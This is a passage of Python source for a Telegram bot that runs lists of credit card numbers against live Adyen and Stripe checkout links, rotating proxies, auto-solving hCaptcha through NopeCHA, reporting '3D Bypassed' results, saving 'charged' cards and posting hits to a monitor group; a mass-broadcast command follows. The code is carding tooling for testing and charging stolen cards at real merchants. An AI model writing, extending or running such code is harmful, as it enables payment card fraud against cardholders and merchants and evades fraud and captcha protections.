    # ── Fetch checkout info with first proxy ──
    loading_msg = await message.reply(
        f"{pe(E['loading'])} {bold('Loading Adyen checkout...')}\n\n"
        f"{pe(E['link'])} {bold(adyen_link)}"
    )

    try:
        proxy_data = random.choice(proxies)
        setup_result = await ayden_process_payment(adyen_link, all_ccs[0], proxy_data)
    except Exception as e:
        _AYD_ACTIVE_USERS.discard(user_id)
        _AYD_STOP_FLAGS.pop(stop_key, None)
        await safe_edit(loading_msg, 
            f"{pe(E['cross'])} {bold('Failed to load checkout!')}\n\n"
            f"{pe(E['warn'])} {bold(str(e)[:100])}"
        )
        return

    if _is_checkout_expired(setup_result):
        _AYD_ACTIVE_USERS.discard(user_id)
        _AYD_STOP_FLAGS.pop(stop_key, None)
        await safe_edit(loading_msg, 
            f"{pe(E['cross2'])} {bold('Checkout Expired!')}\n\n"
            f"{pe(E['warn'])} {bold('This Adyen link is no longer active.')}"
        )
        return

    merchant = setup_result.get("merchant_name") or "-"
    product = setup_result.get("product_name") or "-"
    return_url = setup_result.get("return_url") or "-"
    amount_val = setup_result.get("amount")
    currency = setup_result.get("currency") or ""
    if amount_val is not None:
        amount_str = f"{currency} {amount_val / 100:.2f}" if amount_val > 100 else f"{currency} {amount_val}"
    else:
        amount_str = "-"

    checkout_info = {
        "merchant": merchant,
        "product": product,
        "amount_str": amount_str,
        "link_short": link_short,
        "return_url": return_url,
    }

    # First CC already checked
    results: dict = {all_ccs[0]: setup_result}
    order = list(all_ccs)

    # ── Build initial status message ──
    header = (
        f"{pe(E['gem'])} {bold('Adyen Hitter')} [{bold('1')}/{bold(str(total))}]\n\n"
        f"{pe(E['bolt'])} {bold('Merchant:')} {bold(merchant)}\n"
        f"{pe(E['star'])} {bold('Product:')} {bold(product)}\n"
        f"{pe(E['bank'])} {bold('Amount:')} {bold(amount_str)}\n"
        f"{pe(E['link'])} {bold('Link:')} {bold(link_short)}\n"
        f"{pe(E['globe'])} {bold('URL:')} {bold(return_url)}\n"
    )

    init_lines = [header]
    init_lines.append(_ayd_cc_block(all_ccs[0], setup_result))
    for cc in all_ccs[1:]:
        init_lines.append(f"{pe(E['loading'])} <tg-spoiler>{cc}</tg-spoiler> {bold('checking...')}")

    if skipped > 0:
        init_lines.append(f"\n{pe(E['warn'])} {bold(str(skipped))} {bold('CCs skipped (max')} {bold(str(AYD_MAX_CCS))}{bold(')')}")

    init_lines.append(f"\n{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")

    stop_btn = {
        "inline_keyboard": [[{
            "text": f"{bold('Stop Checking')}",
            "callback_data": f"ayd_stop:{stop_key}",
            "icon_custom_emoji_id": E["stop"],
        }]]
    }

    try:
        await safe_edit(loading_msg, "\n\n".join(init_lines), reply_markup=stop_btn)
    except Exception:
        pass

    status_msg = loading_msg

    # ── Send success to monitor if first CC hit ──
    if _is_success(setup_result):
        auth.save_charged_cc(all_ccs[0], user_id, user_name, "Adyen", amount_str)
        try:
            hit_text = (
                f"{pe(E['gem'])} {bold('Adyen Hit!')} {pe(E['gem'])}\n\n"
                f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{all_ccs[0]}</tg-spoiler>\n"
                f"{pe(E['bolt'])} {bold('Merchant:')} {bold(merchant)}\n"
                f"{pe(E['bank'])} {bold('Amount:')} {bold(amount_str)}\n\n"
                f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
            )
            await bot.send_message(auth.MONITOR_GROUP_ID, hit_text)
        except Exception:
            pass

    # ── If checkout already expired on first CC, stop ──
    if _is_checkout_expired(setup_result):
        _AYD_ACTIVE_USERS.discard(user_id)
        _AYD_STOP_FLAGS.pop(stop_key, None)
        return

    # ── Process remaining CCs one by one (sequential for same link) ──
    try:
        for cc in all_ccs[1:]:
            if _AYD_STOP_FLAGS.get(stop_key):
                results[cc] = {"error": "Stopped", "cc": cc}
                continue

            await _ayd_check_single(
                cc, adyen_link, user_id, status_msg, results, order,
                user_name, user_uname, stop_key, checkout_info,
            )

            if _is_success(results.get(cc, {})):
                auth.save_charged_cc(cc, user_id, user_name, "Adyen", amount_str)
                try:
                    hit_text = (
                        f"{pe(E['gem'])} {bold('Adyen Hit!')} {pe(E['gem'])}\n\n"
                        f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
                        f"{pe(E['bolt'])} {bold('Merchant:')} {bold(merchant)}\n"
                        f"{pe(E['bank'])} {bold('Amount:')} {bold(amount_str)}\n\n"
                        f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
                    )
                    await bot.send_message(auth.MONITOR_GROUP_ID, hit_text)
                except Exception:
                    pass

            if _AYD_STOP_FLAGS.get(stop_key):
                for remaining_cc in all_ccs[all_ccs.index(cc) + 1:]:
                    if remaining_cc not in results:
                        results[remaining_cc] = {"error": "Stopped (checkout expired)", "cc": remaining_cc}
                break

        # ── Final update (remove stop button) ──
        done_count = sum(1 for cc in order if cc in results)
        final_lines = [
            f"{pe(E['gem'])} {bold('Adyen Hitter')} [{bold(str(done_count))}/{bold(str(total))}]\n\n"
            f"{pe(E['bolt'])} {bold('Merchant:')} {bold(merchant)}\n"
            f"{pe(E['star'])} {bold('Product:')} {bold(product)}\n"
            f"{pe(E['bank'])} {bold('Amount:')} {bold(amount_str)}\n"
            f"{pe(E['link'])} {bold('Link:')} {bold(link_short)}\n"
            f"{pe(E['globe'])} {bold('URL:')} {bold(return_url)}\n"
        ]
        for cc in order:
            if cc in results:
                final_lines.append(_ayd_cc_block(cc, results[cc]))
        if skipped > 0:
            final_lines.append(f"\n{pe(E['warn'])} {bold(str(skipped))} {bold('CCs skipped (max')} {bold(str(AYD_MAX_CCS))}{bold(')')}")

        expired_any = any(_is_checkout_expired(results.get(cc, {})) for cc in order)
        if expired_any:
            final_lines.append(f"\n{pe(E['cross2'])} {bold('Checkout expired — stopped.')}")

        final_lines.append(f"\n{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")

        try:
            await safe_edit(status_msg, "\n\n".join(final_lines))
        except Exception:
            pass

        # Pin if any success
        if any(_is_success(results.get(cc, {})) for cc in order):
            try:
                await bot.pin_chat_message(message.chat.id, status_msg.message_id, disable_notification=True)
            except Exception:
                pass

    finally:
        _AYD_ACTIVE_USERS.discard(user_id)
        _AYD_STOP_FLAGS.pop(stop_key, None)


@router.callback_query(F.data.startswith("ayd_stop:"))
async def cb_ayd_stop(callback: types.CallbackQuery):
    stop_key = callback.data.split(":", 1)[1]
    parts = stop_key.split(":")
    if len(parts) >= 3:
        owner_id = int(parts[2])
    else:
        owner_id = 0

    if callback.from_user.id != owner_id and not auth.is_owner(callback.from_user.id):
        await callback.answer(bold("Only the owner can stop this check!"), show_alert=True)
        return

    _AYD_STOP_FLAGS[stop_key] = True
    await callback.answer(bold("Stopping Adyen check..."), show_alert=True)


# ══════════════════════════════════════════════════════════════════════════════
#  /hit COMMAND — Stripe checkout autohitter (max 10 CCs)
# ══════════════════════════════════════════════════════════════════════════════

HIT_MAX_CCS = 10
_HIT_EDIT_LOCKS: dict[int, asyncio.Lock] = {}
_HIT_STOP_FLAGS: dict[str, bool] = {}
_HIT_ACTIVE_USERS: set[int] = set()



def _hit_is_payment_success(result: dict) -> bool:
    """True when hit.php reports a successful charge (status or response text)."""
    if not result.get("ok"):
        return False
    status = (result.get("result_status") or "").lower()
    if status in ("charge", "charged"):
        return True
    msg = (result.get("result_msg") or "").lower()
    return any(x in msg for x in ("payment successful", "succeeded", " paid"))


def _hit_status_line(result: dict) -> str:
    """Map Stripe hit result to a styled status line."""
    if not result.get("ok"):
        err = result.get("error") or ""
        if result.get("session_dead"):
            return f"{pe(E['cross2'])} {bold('Session Dead')}"
        return f"{pe(E['warn2'])} {bold(err[:60])}"

    if result.get("hcaptcha"):
        return f"{pe(E['warn2'])} {bold('hCaptcha Required')}"

    status = result.get("result_status", "")
    msg = result.get("result_msg", "")

    if _hit_is_payment_success(result):
        return f"{pe(E['gem'])} {bold('Charged / Success!')}"
    if status in ("live", "approved"):
        msg_lower = msg.lower()
        if "insufficient" in msg_lower:
            return f"{pe(E['check2'])} {bold('Insufficient Funds')}"
        if "cvc" in msg_lower:
            return f"{pe(E['check3'])} {bold('Incorrect CVC — Live')}"
        return f"{pe(E['check'])} {bold('Live — ' + msg)}"
    return f"{pe(E['cross'])} {bold('Declined')}"


def _hit_raw_response(result: dict) -> str:
    if not result.get("ok"):
        return result.get("error") or "Failed"
    return result.get("result_msg") or "Unknown"


def _hit_cc_block(cc: str, result: dict) -> str:
    sl = _hit_status_line(result)
    raw = _hit_raw_response(result)
    tds_line = f"\n{pe(E['bolt'])} {bold('3D Bypassed')}" if result.get("tds_bypassed") else ""
    return (
        f"{sl}\n"
        f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
        f"{pe(R['gate'])} {bold('Response:')} {bold(raw)}"
        f"{tds_line}"
    )


def _hit_is_session_dead(result: dict) -> bool:
    return bool(result.get("session_dead"))


def _hit_is_success(result: dict) -> bool:
    return _hit_is_payment_success(result)


def _hit_is_live(result: dict) -> bool:
    return (
        result.get("ok", False)
        and result.get("result_status") in ("live", "approved")
        and not _hit_is_payment_success(result)
    )


async def _hit_check_single(
    cc_str: str, checkout_url: str, user_id: int,
    status_msg: types.Message, results: dict, order: list,
    user_name: str, user_uname: str, stop_key: str,
    checkout_info: dict,
    nopecha_key: str = "",
):
    if _HIT_STOP_FLAGS.get(stop_key):
        results[cc_str] = {"ok": False, "error": "Stopped"}
        return

    proxies = get_user_proxies(user_id)
    proxy_data = random.choice(proxies) if proxies else None

    sem = get_user_semaphore(user_id)
    async with sem:
        try:
            result = await asyncio.get_running_loop().run_in_executor(
                CHECKER_POOL, hit.run_hit_check, checkout_url, cc_str, proxy_data, 3, nopecha_key,
            )
        except Exception as e:
            result = {"ok": False, "error": str(e)[:80]}

    msg_id = status_msg.message_id
    if msg_id not in _HIT_EDIT_LOCKS:
        _HIT_EDIT_LOCKS[msg_id] = asyncio.Lock()

    results[cc_str] = result

    if _hit_is_session_dead(result):
        _HIT_STOP_FLAGS[stop_key] = True

    # ── Update shared message ──
    async def _do_edit():
        async with _HIT_EDIT_LOCKS[msg_id]:
            done_count = sum(1 for cc in order if cc in results)
            total = len(order)
            header = (
                f"{pe(E['gem'])} {bold('Stripe Checker')} [{bold(str(done_count))}/{bold(str(total))}]\n\n"
                f"{pe(E['bolt'])} {bold('Merchant:')} {bold(checkout_info.get('merchant', '-'))}\n"
                f"{pe(E['star'])} {bold('Product:')} {bold(checkout_info.get('product', '-'))}\n"
                f"{pe(E['bank'])} {bold('Amount:')} {bold(checkout_info.get('amount_str', '-'))}\n"
                f"{pe(E['link'])} {bold('Link:')} {bold(checkout_info.get('link_short', '-'))}\n"
                f"{pe(E['globe'])} {bold('URL:')} {bold(checkout_info.get('success_url', '-'))}\n"
            )
            lines = [header]
            for cc in order:
                if cc in results:
                    lines.append(_hit_cc_block(cc, results[cc]))
                else:
                    lines.append(
                        f"{pe(E['loading'])} <tg-spoiler>{cc}</tg-spoiler> {bold('checking...')}"
                    )
            if _HIT_STOP_FLAGS.get(stop_key) and _hit_is_session_dead(results.get(cc_str, {})):
                lines.append(f"\n{pe(E['cross2'])} {bold('Session dead — stopped.')}")
            lines.append(f"\n{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")
            try:
                await safe_edit(status_msg, "\n\n".join(lines))
            except Exception:
                pass

    await _do_edit()

    if sum(1 for cc in order if cc in results) == len(order):
        _HIT_EDIT_LOCKS.pop(msg_id, None)


@router.message(Command("hit"))
async def cmd_hit(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id

    if auth.is_banned(user_id):
        return

    # Owner only — no admin, no premium, nobody else
    if not auth.is_owner(user_id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Owner only command')}"
        )
        return

    if user_id in _HIT_ACTIVE_USERS:
        await message.reply(
            f"{pe(E['warn'])} {bold('Your Stripe check is already in progress!')}\n\n"
            f"{pe(E['next'])} {bold('Wait for it to complete or tap')} {bold('Stop')} {bold('first.')}"
        )
        return

    # ── Extract link + CCs ──
    raw_text = ""
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        raw_text = args[1]

    if message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw_text = raw_text + "\n" + reply_text if raw_text else reply_text

    if not raw_text.strip():
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')}\n\n"
            f"{pe(E['next'])} /hit <Stripe URL>\n"
            f"cc|mm|yy|cvv\n\n"
            f"{pe(E['bolt'])} {bold('Supported links:')}\n"
            f"• checkout.stripe.com/c/pay/...\n"
            f"• billing.stripe.com/p/session/...\n"
            f"• invoice.stripe.com/i/...\n"
            f"• Custom domain with cs_live_...\n\n"
            f"{pe(E['bolt'])} {bold('Max')} {bold(str(HIT_MAX_CCS))} {bold('CCs per check.')}"
        )
        return

    # ── Find Stripe link (checkout / billing portal / invoice / payment link / custom domain) ──
    link_match = re.search(
        r'https?://[^\s]*(?:'
        r'checkout\.stripe\.com'
        r'|billing\.stripe\.com'
        r'|invoice\.stripe\.com'
        r'|payment\.stripe\.com'
        r'|pay\.stripe\.com'
        r'|cs_(?:live|test)_'
        r'|plink_(?:live|test)_'
        r')[^\s]*',
        raw_text, re.IGNORECASE,
    )
    if not link_match:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Stripe link found!')}\n\n"
            f"{pe(E['next'])} {bold('Supported URLs:')}\n"
            f"• checkout.stripe.com/c/pay/...\n"
            f"• billing.stripe.com/p/session/...\n"
            f"• invoice.stripe.com/i/...\n"
            f"• Custom domain with cs_live_... or plink_live_..."
        )
        return
    checkout_url = link_match.group(0)

    # ── Find CCs ──
    from helpers import CC_PATTERN
    all_ccs = _DedupeList()
    for m in CC_PATTERN.finditer(raw_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)

    if not all_ccs:
        for line in raw_text.strip().splitlines():
            line = line.strip()
            parts = re.split(r'[|/]', line)
            if len(parts) >= 4:
                num = parts[0].strip()
                if num.isdigit() and len(num) >= 13:
                    cc = "|".join(p.strip() for p in parts[:4])
                    if cc not in all_ccs:
                        all_ccs.append(cc)

    if not all_ccs:
        await message.reply(
            f"{pe(E['cross'])} {bold('No valid CCs found!')}\n\n"
            f"{pe(E['next'])} {bold('Format:')} cc|mm|yy|cvv"
        )
        return

    skipped = 0
    if len(all_ccs) > HIT_MAX_CCS:
        skipped = len(all_ccs) - HIT_MAX_CCS
        all_ccs = all_ccs[:HIT_MAX_CCS]

    # ── Check proxy ──
    proxies = get_user_proxies(user_id)
    if not proxies:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Proxy Set!')}\n\n"
            f"{pe(E['warn'])} {bold('You must add a proxy before checking.')}\n"
            f"{pe(E['next'])} {bold('Use:')} /proxy host:port:user:pass"
        )
        return

    user_name = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""
    total = len(all_ccs)
    chat_id = message.chat.id
    stop_key = f"hit:{chat_id}:{user_id}"
    _HIT_STOP_FLAGS[stop_key] = False
    _HIT_ACTIVE_USERS.add(user_id)

    # ── Get NopeCHA key for auto captcha solving ──
    nopecha_key = auth.get_nopecha_key(user_id)

    # Build a readable short label from any Stripe link type
    _id_m = re.search(r'(cs_(?:live|test)_[a-zA-Z0-9]+|plink_(?:live|test)_[a-zA-Z0-9]+)', checkout_url)
    if _id_m:
        link_short = _id_m.group(1)[:28] + "..."
    elif "billing.stripe.com" in checkout_url:
        link_short = "billing.stripe.com/..."
    elif "invoice.stripe.com" in checkout_url:
        link_short = "invoice.stripe.com/..."
    elif "payment.stripe.com" in checkout_url or "pay.stripe.com" in checkout_url:
        link_short = "pay.stripe.com/..."
    else:
        link_short = checkout_url.split("/")[-1][:28] + "..."

    # ── Grab session info with first CC ──
    loading_msg = await message.reply(
        f"{pe(E['loading'])} {bold('Loading Stripe checkout...')}\n\n"
        f"{pe(E['link'])} {bold(checkout_url[:60] + '...')}"
    )

    try:
        proxy_data = random.choice(proxies)
        first_result = await asyncio.get_running_loop().run_in_executor(
            CHECKER_POOL, hit.run_hit_check, checkout_url, all_ccs[0], proxy_data, 3, nopecha_key,
        )
    except Exception as e:
        _HIT_ACTIVE_USERS.discard(user_id)
        _HIT_STOP_FLAGS.pop(stop_key, None)
        await safe_edit(loading_msg, 
            f"{pe(E['cross'])} {bold('Failed to load checkout!')}\n\n"
            f"{pe(E['warn'])} {bold(str(e)[:100])}"
        )
        return

    if not first_result.get("ok") and _hit_is_session_dead(first_result):
        _HIT_ACTIVE_USERS.discard(user_id)
        _HIT_STOP_FLAGS.pop(stop_key, None)
        await safe_edit(loading_msg, 
            f"{pe(E['cross2'])} {bold('Session Dead!')}\n\n"
            f"{pe(E['warn'])} {bold(first_result.get('error', 'Checkout expired or completed.'))}"
        )
        return

    merchant = first_result.get("merchant") or "-"
    product = first_result.get("product") or "-"
    amount_str = first_result.get("price_display") or "-"
    success_url = first_result.get("success_url") or "-"
    if success_url != "-" and len(success_url) > 50:
        from urllib.parse import urlparse as _urlparse
        _p = _urlparse(success_url)
        success_url = f"{_p.scheme}://{_p.netloc}{_p.path[:30]}..."

    checkout_info = {
        "merchant": merchant,
        "product": product,
        "amount_str": amount_str,
        "link_short": link_short,
        "success_url": success_url,
    }

    results: dict = {all_ccs[0]: first_result}
    order = list(all_ccs)

    # ── Build initial status message ──
    header = (
        f"{pe(E['gem'])} {bold('Stripe Checker')} [{bold('1')}/{bold(str(total))}]\n\n"
        f"{pe(E['bolt'])} {bold('Merchant:')} {bold(merchant)}\n"
        f"{pe(E['star'])} {bold('Product:')} {bold(product)}\n"
        f"{pe(E['bank'])} {bold('Amount:')} {bold(amount_str)}\n"
        f"{pe(E['link'])} {bold('Link:')} {bold(link_short)}\n"
        f"{pe(E['globe'])} {bold('URL:')} {bold(success_url)}\n"
    )

    init_lines = [header]
    init_lines.append(_hit_cc_block(all_ccs[0], first_result))
    for cc in all_ccs[1:]:
        init_lines.append(f"{pe(E['loading'])} <tg-spoiler>{cc}</tg-spoiler> {bold('checking...')}")

    if skipped > 0:
        init_lines.append(f"\n{pe(E['warn'])} {bold(str(skipped))} {bold('CCs skipped (max')} {bold(str(HIT_MAX_CCS))}{bold(')')}")

    init_lines.append(f"\n{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")

    init_kb = {
        "inline_keyboard": [[{
            "text": f"{bold('Stop Checking')}",
            "callback_data": f"hit_stop:{stop_key}",
            "icon_custom_emoji_id": E["stop"],
        }]]
    }

    try:
        await safe_edit(loading_msg, "\n\n".join(init_lines), reply_markup=init_kb)
    except Exception:
        pass

    status_msg = loading_msg
    msg_id_first = loading_msg.message_id
    _HIT_EDIT_LOCKS[msg_id_first] = asyncio.Lock()

    # ── Send success to monitor if first CC hit ──
    if _hit_is_success(first_result):
        auth.save_charged_cc(all_ccs[0], user_id, user_name, "Stripe", amount_str)
        try:
            hit_text = (
                f"{pe(E['gem'])} {bold('Stripe Hit!')} {pe(E['gem'])}\n\n"
                f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{all_ccs[0]}</tg-spoiler>\n"
                f"{pe(E['bolt'])} {bold('Merchant:')} {bold(merchant)}\n"
                f"{pe(E['bank'])} {bold('Amount:')} {bold(amount_str)}\n"
                f"{pe(R['gate'])} {bold('Response:')} {bold(_hit_raw_response(first_result))}\n\n"
                f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
            )
            await bot.send_message(auth.MONITOR_GROUP_ID, hit_text)
        except Exception:
            pass
        # Charged notification to join channel
        await _send_charged_notification(
            user_id=user_id,
            username=user_uname or "",
            full_name=user_name or "",
            amount=amount_str,
            gate_type="stripe",
            is_3d_bypassed=bool(first_result.get("tds_bypassed")),
        )
    elif _hit_is_live(first_result):
        try:
            live_text = (
                f"{_hit_status_line(first_result)}\n\n"
                f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{all_ccs[0]}</tg-spoiler>\n"
                f"{pe(E['bolt'])} {bold('Merchant:')} {bold(merchant)}\n"
                f"{pe(E['bank'])} {bold('Amount:')} {bold(amount_str)}\n"
                f"{pe(R['gate'])} {bold('Response:')} {bold(_hit_raw_response(first_result))}\n\n"
                f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
            )
            await _send_approved(live_text)
        except Exception:
            pass

    # ── If session dead on first CC, stop ──
    if _hit_is_session_dead(first_result):
        _HIT_ACTIVE_USERS.discard(user_id)
        _HIT_STOP_FLAGS.pop(stop_key, None)
        return

    # ── Process remaining CCs sequentially ──
    try:
        for cc in all_ccs[1:]:
            if _HIT_STOP_FLAGS.get(stop_key):
                results[cc] = {"ok": False, "error": "Stopped"}
                continue

            await _hit_check_single(
                cc, checkout_url, user_id, status_msg, results, order,
                user_name, user_uname, stop_key, checkout_info,
                nopecha_key=nopecha_key,
            )

            if _hit_is_success(results.get(cc, {})):
                auth.save_charged_cc(cc, user_id, user_name, "Stripe", amount_str)
                try:
                    hit_text = (
                        f"{pe(E['gem'])} {bold('Stripe Hit!')} {pe(E['gem'])}\n\n"
                        f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
                        f"{pe(E['bolt'])} {bold('Merchant:')} {bold(merchant)}\n"
                        f"{pe(E['bank'])} {bold('Amount:')} {bold(amount_str)}\n"
                        f"{pe(R['gate'])} {bold('Response:')} {bold(_hit_raw_response(results[cc]))}\n\n"
                        f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
                    )
                    await bot.send_message(auth.MONITOR_GROUP_ID, hit_text)
                except Exception:
                    pass
                # Charged notification to join channel
                await _send_charged_notification(
                    user_id=user_id,
                    username=user_uname or "",
                    full_name=user_name or "",
                    amount=amount_str,
                    gate_type="stripe",
                    is_3d_bypassed=bool(results.get(cc, {}).get("tds_bypassed")),
                )
            elif _hit_is_live(results.get(cc, {})):
                try:
                    live_text = (
                        f"{_hit_status_line(results[cc])}\n\n"
                        f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
                        f"{pe(E['bolt'])} {bold('Merchant:')} {bold(merchant)}\n"
                        f"{pe(E['bank'])} {bold('Amount:')} {bold(amount_str)}\n"
                        f"{pe(R['gate'])} {bold('Response:')} {bold(_hit_raw_response(results[cc]))}\n\n"
                        f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
                    )
                    await _send_approved(live_text)
                except Exception:
                    pass

            if _HIT_STOP_FLAGS.get(stop_key):
                for remaining_cc in all_ccs[all_ccs.index(cc) + 1:]:
                    if remaining_cc not in results:
                        results[remaining_cc] = {"ok": False, "error": "Stopped (session dead)"}
                break

        # ── Final update (remove stop button) ──
        done_count = sum(1 for cc in order if cc in results)
        final_lines = [
            f"{pe(E['gem'])} {bold('Stripe Checker')} [{bold(str(done_count))}/{bold(str(total))}]\n\n"
            f"{pe(E['bolt'])} {bold('Merchant:')} {bold(merchant)}\n"
            f"{pe(E['star'])} {bold('Product:')} {bold(product)}\n"
            f"{pe(E['bank'])} {bold('Amount:')} {bold(amount_str)}\n"
            f"{pe(E['link'])} {bold('Link:')} {bold(link_short)}\n"
            f"{pe(E['globe'])} {bold('URL:')} {bold(success_url)}\n"
        ]
        for cc in order:
            if cc in results:
                final_lines.append(_hit_cc_block(cc, results[cc]))
        if skipped > 0:
            final_lines.append(f"\n{pe(E['warn'])} {bold(str(skipped))} {bold('CCs skipped (max')} {bold(str(HIT_MAX_CCS))}{bold(')')}")

        dead_any = any(_hit_is_session_dead(results.get(cc, {})) for cc in order)
        if dead_any:
            final_lines.append(f"\n{pe(E['cross2'])} {bold('Session dead — stopped.')}")

        final_lines.append(f"\n{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")

        try:
            await safe_edit(status_msg, "\n\n".join(final_lines), reply_markup=None)
        except Exception:
            pass

        # Pin if any success
        if any(_hit_is_success(results.get(cc, {})) for cc in order):
            try:
                await bot.pin_chat_message(message.chat.id, status_msg.message_id, disable_notification=True)
            except Exception:
                pass

    finally:
        _HIT_ACTIVE_USERS.discard(user_id)
        _HIT_STOP_FLAGS.pop(stop_key, None)
        _HIT_EDIT_LOCKS.pop(msg_id_first, None)


@router.callback_query(F.data.startswith("hit_stop:"))
async def cb_hit_stop(callback: types.CallbackQuery):
    stop_key = callback.data.split(":", 1)[1]
    parts = stop_key.split(":")
    if len(parts) >= 3:
        owner_id = int(parts[2])
    else:
        owner_id = 0

    if callback.from_user.id != owner_id and not auth.is_owner(callback.from_user.id):
        await callback.answer(bold("Only the owner can stop this check!"), show_alert=True)
        return

    _HIT_STOP_FLAGS[stop_key] = True
    await callback.answer(bold("Stopping Stripe check..."), show_alert=True)


# ══════════════════════════════════════════════════════════════════════════════
#  /broad COMMAND — Owner broadcasts message to all users
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("broad"))
async def cmd_broad(message: types.Message):
    if not auth.is_owner(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Owner only command!')}")
        return

    broadcast_text = None
    broadcast_entities = None
    use_copy = False
    reply_msg = None

    # ── Mode 1: Reply to a message ────────────────────────────────────────────
    if message.reply_to_message:
        use_copy = True
        reply_msg = message.reply_to_message

    # ── Mode 2: Inline text after /broad ──────────────────────────────────────
    else:
        raw_text = message.text or ""
        raw_entities = message.entities or []

        # Find where /broad command ends
        cmd_end = 0
        for ent in raw_entities:
            if ent.type == "bot_command" and ent.offset == 0:
                cmd_end = ent.offset + ent.length
                break

        if cmd_end == 0:
            cmd_end = len("/broad")

        # Strip the command prefix and any leading whitespace/newline
        remaining = raw_text[cmd_end:]
        # Count how many chars of whitespace/newline after command
        stripped = remaining.lstrip("\n \t")
        ws_count = len(remaining) - len(stripped)
        total_prefix = cmd_end + ws_count

        broadcast_text = stripped

        if not broadcast_text:
            await message.reply(
                f"{pe(E['warn'])} {bold('Usage:')}\n\n"
                f"{pe(E['next'])} /broad {bold('Your message here')}\n"
                f"{pe(E['next'])} {bold('Or reply to any message with')} /broad"
            )
            return

        # Shift entities: only keep entities that fall within the broadcast text
        adjusted = []
        for ent in raw_entities:
            if ent.type == "bot_command" and ent.offset == 0:
                continue  # Skip the /broad command entity itself

            new_offset = ent.offset - total_prefix
            # Only include entities that are within the broadcast text
            if new_offset >= 0 and (new_offset + ent.length) <= len(broadcast_text):
                adjusted.append(types.MessageEntity(
                    type=ent.type,
                    offset=new_offset,
                    length=ent.length,
                    url=ent.url if hasattr(ent, 'url') else None,
                    user=ent.user if hasattr(ent, 'user') else None,
                    language=ent.language if hasattr(ent, 'language') else None,
                    custom_emoji_id=ent.custom_emoji_id if hasattr(ent, 'custom_emoji_id') else None,
                ))

        broadcast_entities = adjusted if adjusted else None

    # ── Get all user IDs ──────────────────────────────────────────────────────
    all_ids = auth.get_all_user_ids()
    total = len(all_ids)

    if total == 0:
        await message.reply(f"{pe(E['cross'])} {bold('No users found in users.txt!')}")
        return

    # ── Status message ────────────────────────────────────────────────────────
    status_msg = await message.reply(
        f"{pe(E['rocket'])} {bold('Broadcasting...')}\n\n"
        f"{pe(E['bolt'])} {bold('Total Users:')} {bold(str(total))}\n"
        f"{pe(E['hourglass'])} {bold('Sending...')} {bold('0')}/{bold(str(total))}"
    )

    counters = {"sent": 0, "failed": 0, "blocked": 0, "pinned": 0, "done": 0}
    lock = asyncio.Lock()
    failed_ids: list[int] = []
    sem = asyncio.Semaphore(25)  # 25 concurrent sends ≈ safe Telegram flood limit

    async def _send_one(uid: int) -> bool:
        async with sem:
            try:
                if use_copy:
                    r = await bot.copy_message(
                        chat_id=uid,
                        from_chat_id=reply_msg.chat.id,
                        message_id=reply_msg.message_id,
                    )
                else:
                    r = await bot.send_message(
                        chat_id=uid,
                        text=broadcast_text,
                        entities=broadcast_entities,
                    )
                try:
                    await bot.pin_chat_message(uid, r.message_id, disable_notification=True)
                    async with lock:
                        counters["pinned"] += 1
                except Exception:
                    pass
                async with lock:
                    counters["sent"] += 1
                return True
            except Exception as e:
                err = str(e).lower()
                async with lock:
                    if "blocked" in err or "deactivated" in err or "not found" in err:
                        counters["blocked"] += 1
                    else:
                        counters["failed"] += 1
                        failed_ids.append(uid)
                return False
            finally:
                async with lock:
                    counters["done"] += 1

    # ── Progress updater ──────────────────────────────────────────────────────
    async def _update_progress(phase: str):
        while True:
            await asyncio.sleep(1.5)
            async with lock:
                d = counters["done"]
            try:
                await safe_edit(status_msg, 
                    f"{pe(E['rocket'])} {bold(phase)}\n\n"
                    f"{pe(E['bolt'])} {bold('Progress:')} {bold(str(d))}/{bold(str(total))}\n"
                    f"{pe(E['check'])} {bold('Sent:')} {bold(str(counters['sent']))}\n"
                    f"{pe(E['star'])} {bold('Pinned:')} {bold(str(counters['pinned']))}\n"
                    f"{pe(E['cross'])} {bold('Blocked:')} {bold(str(counters['blocked']))}\n"
                    f"{pe(E['warn'])} {bold('Failed:')} {bold(str(counters['failed']))}"
                )
            except Exception:
                pass
            if d >= total:
                break

    # ── Pass 1: send to everyone in parallel ─────────────────────────────────
    prog_task = asyncio.create_task(_update_progress("Broadcasting..."))
    await asyncio.gather(*[_send_one(uid) for uid in all_ids])
    prog_task.cancel()

